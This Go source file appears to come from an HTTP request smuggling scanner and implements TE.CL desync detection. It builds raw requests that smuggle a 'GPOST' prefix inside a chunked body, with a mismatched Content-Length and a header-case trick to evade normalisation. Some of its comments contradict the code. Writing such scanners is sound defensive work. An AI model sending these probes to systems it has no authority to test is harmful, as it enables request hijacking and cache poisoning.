package scan

// tecl.go — TE.CL desync detection
//
// Strategy:
// Back-end uses Content-Length; front-end uses Transfer-Encoding.
// We send a chunked body where the chunk size is deliberately larger than actual data,
// causing the back-end to wait for more bytes (timeout) while front-end is satisfied.

import (
	"fmt"
	"net/url"

	"github.com/smuggled/smuggled/pkg/permute"
	"github.com/smuggled/smuggled/pkg/report"
)

// ScanTECL runs TE.CL detection across all applicable permutations.
func ScanTECL(target *url.URL, base []byte, cfg Config, rep *report.Reporter) {
	probeMethod := effectiveMethod(cfg, true)
	workingBase := base
	if probeMethod != effectiveMethods(cfg)[0] && len(cfg.Methods) > 0 {
		rep.Log("TE.CL: upgrading method %s→POST (body required; use --force-method to override)", effectiveMethods(cfg)[0])
		workingBase = permute.SetMethod(base, probeMethod)
		workingBase = permute.SetHeader(workingBase, "Content-Type", "application/x-www-form-urlencoded")
		workingBase = permute.SetHeader(workingBase, "Content-Length", "3")
		workingBase = setBody(workingBase, "x=y")
	}

	techniques := filterTechniques(permute.H1Techniques(), cfg.TechniquesFilter)

	for _, tech := range techniques {
		if tech.H2Only {
			continue
		}

		rep.Log("TE.CL probe: technique=%s target=%s method=%s", tech.Name, target.Host, probeMethod)

		mutated := permute.ApplyTE(workingBase, tech.Name)
		if mutated == nil {
			continue
		}
		mutated = addTE(mutated)
		mutated = setConnection(mutated, "close")

		// TE.CL payload:
		// Send a chunked body where the chunk header says 6 bytes but only provides 3,
		// then terminate. Back-end (using CL) forwards all of it but the server sits
		// waiting because the chunk promised more.
		smuggledPrefix := "GPOST / HTTP/1.1\r\nHost: " + target.Hostname() + "\r\n\r\n"
		chunkSize := len(smuggledPrefix)
		// Body: real chunk terminator 0\r\n\r\n, but CL points just past the terminator
		// so back-end reads the smuggled prefix as the start of the next request.
		body := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", chunkSize, smuggledPrefix)

		// CL is set to point at the end of the chunk size line (before actual data)
		// back-end (CL-based) will only forward up to CL bytes, stopping mid-chunk.
		clVal := len(fmt.Sprintf("%x\r\n", chunkSize)) // just the size line length
		probeReq := setBody(mutated, body)
		probeReq = setContentLength(probeReq, clVal)

		// Bypass content-length normalisation: lowercase to avoid lib interference
		probeReq = bypassCLFix(probeReq)

		_, _, timedOut, err := rawRequest(target, probeReq, cfg)
		if err != nil {
			rep.Log("TE.CL send error (%s): %v", tech.Name, err)
			continue
		}

		if timedOut {
			confirmed := confirmTECL(target, mutated, smuggledPrefix, cfg, rep)
			sev := report.SeverityProbable
			if confirmed {
				sev = report.SeverityConfirmed
			}
			rep.Emit(report.Finding{
				Target:      target.String(),
				Severity:    sev,
				Type:        "TE.CL",
				Technique:   tech.Name,
				Description: "Front-end uses Transfer-Encoding; back-end uses Content-Length",
				Evidence:    fmt.Sprintf("timeout=true confirmed=%v", confirmed),
				RawProbe:    truncate(string(probeReq), 512),
			})
			return
		}
	}
}

func confirmTECL(target *url.URL, base []byte, prefix string, cfg Config, rep *report.Reporter) bool {
	confirmed := 0
	needed := cfg.ConfirmReps

	chunkSize := len(prefix)
	body := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", chunkSize, prefix)
	clVal := len(fmt.Sprintf("%x\r\n", chunkSize))
	probeReq := setBody(base, body)
	probeReq = setContentLength(probeReq, clVal)
	probeReq = bypassCLFix(probeReq)

	for i := 0; i < needed+2; i++ {
		_, _, timedOut, err := rawRequest(target, probeReq, cfg)
		if err != nil {
			continue
		}
		if timedOut {
			confirmed++
		}
	}
	rep.Log("TE.CL confirmation: %d/%d timeouts", confirmed, needed)
	return confirmed >= needed
}

// bypassCLFix lowercases "Content-Length" to "Content-length" to prevent some
// intermediaries from normalising the duplicate header, mirroring
// ChunkContentScan.bypassContentLengthFix().
func bypassCLFix(req []byte) []byte {
	return permute.SetHeader(req, "content-length", // lowercase key avoids lib override
		fmt.Sprintf("%s", permute.GetHeader(req, "Content-Length")))
}
